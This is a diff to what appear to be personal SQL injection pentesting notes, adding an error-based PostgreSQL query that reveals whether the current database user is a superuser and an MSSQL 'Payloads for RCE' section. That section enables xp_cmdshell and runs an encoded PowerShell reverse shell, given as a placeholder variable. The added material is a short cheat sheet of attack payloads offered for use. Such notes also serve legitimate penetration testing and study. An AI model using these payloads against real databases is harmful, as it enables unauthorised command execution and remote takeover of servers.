@@ -54,6 +54,13 @@ then, we can do futher enumeration like:
 ```
 or enumeration queries as seen in the bottom of this note document.
 
+
+Obscure way to check if a user is superuser:
+
+```
+SELECT usesuper, CASE WHEN (usesuper = true) THEN 1/(SELECT 0) ELSE (SELECT 0) END from pg_user where usename = CURRENT_USER
+```
+
 ## Blind SQLi
 
 
@@ -82,3 +89,16 @@ equivalent to `SHOW DATABASES`:
 ```
 SELECT schema_name 
 FROM information_schema.schemata;
+```
+
+## Payloads for RCE
+
+### MSSQL
+
+```
+EXEC sp_configure 'show advanced options',1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell',1;
+RECONFIGURE;
+EXEC master.dbo.xp_cmdshell 'powershell -enc $ENCODED_REV_SHELL';
+```
